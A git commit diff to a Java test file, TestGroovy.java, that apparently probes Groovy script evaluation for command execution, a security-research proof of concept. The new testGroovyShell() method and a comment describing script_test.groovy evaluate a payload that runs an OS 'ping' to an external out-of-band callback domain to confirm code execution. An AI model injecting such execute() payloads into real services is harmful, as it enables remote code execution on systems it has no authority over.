87e46b634714e1ce913bc2d62540067b650f9231
shadowsock5 <30398606+shadowsock5@users.noreply.github.com>
2020-03-12 15:57:36 +0800

    Update TestGroovy.java

--- TestGroovy.java
+++ TestGroovy.java
@@ -10,25 +10,34 @@ import javax.script.ScriptException;
 
 public class TestGroovy{
         public static void main(String[] args) throws Exception{
-                //CompilerConfiguration configuratorConfig = new CompilerConfiguration();
-
-                Binding binding = new Binding();
-                binding.setVariable("name", "cqq");    //这一行没必要
-
-                GroovyShell groovyShell = new GroovyShell(binding);
                 //ScriptEngineManager factory = new ScriptEngineManager();
                 //ScriptEngine engine = factory.getEngineByName("groovy");
                 //engine.put("first", "HELLO");
                 //engine.put("second", "world");
                 //String result = (String) engine.eval("first.toLowerCase() + ' ' + second.toUpperCase()");
-                //Object obj = groovyShell.evaluate("'ping groovy.a69a8d07833b17bfc67a.d.zhack.ca'.execute();");
-                //System.out.println(obj);
-                testGroovyScriptEngine();
+                //testGroovyScriptEngine();
+                //testGroovyShell();
+                //
+
         }
 
         public static void testGroovyScriptEngine() throws Exception{
                 GroovyScriptEngine engine = new GroovyScriptEngine("");
                 Object obj = engine.run("script_test.groovy", "cqq");
+                /**
+                 * "script_test.groovy"
+                 * 'ping groovy2.a69a8d07833b17bfc67a.d.zhack.ca'.execute();
+                 */
+                System.out.println(obj);
+        }
+
+
+        public static void testGroovyShell() throws Exception{
+                Binding binding = new Binding();
+                binding.setVariable("name", "cqq");    //这一行没必要
+
+                GroovyShell groovyShell = new GroovyShell(binding);
+                Object obj = groovyShell.evaluate("'ping groovy.a69a8d07833b17bfc67a.d.zhack.ca'.execute();");
                 System.out.println(obj);
         }
 }
